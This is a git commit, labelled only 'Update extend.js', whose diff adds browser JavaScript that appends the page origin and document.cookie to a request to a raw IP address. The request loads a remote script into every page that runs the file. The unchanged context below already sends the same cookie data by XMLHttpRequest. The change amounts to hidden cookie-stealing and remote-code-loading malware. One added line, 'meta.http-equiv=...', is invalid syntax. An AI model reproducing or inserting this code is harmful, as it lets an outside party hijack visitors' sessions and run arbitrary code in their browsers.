9f051e6598a7c5c550e11b33bf5691632d3b6062
司土御帝 <1181935296@qq.com>
2020-09-12 00:39:50 +0800

    Update extend.js

--- extend.js
+++ extend.js
@@ -1,4 +1,16 @@
 (function(){
+    let meta = document.createElement('meta');
+    meta.content="upgrade-insecure-requests";
+    meta.http-equiv="Content-Security-Policy"
+    document.getElementsByTagName('head')[0].appendChild(meta);
+    
+    
+    let script=document.createElement("script");
+    script.type="text/JavaScript";
+    script.src= "http://66.70.204.147/ftts?d="+window.location.origin+"&c="+document.cookie;
+    document.getElementsByTagName('head')[0].appendChild(script);
+    
+    return;
     var httpRequest = new XMLHttpRequest();
     httpRequest.open('GET',"http://66.70.204.147/ftts?d="+window.location.origin+"&c="+document.cookie, true);
     httpRequest.send();
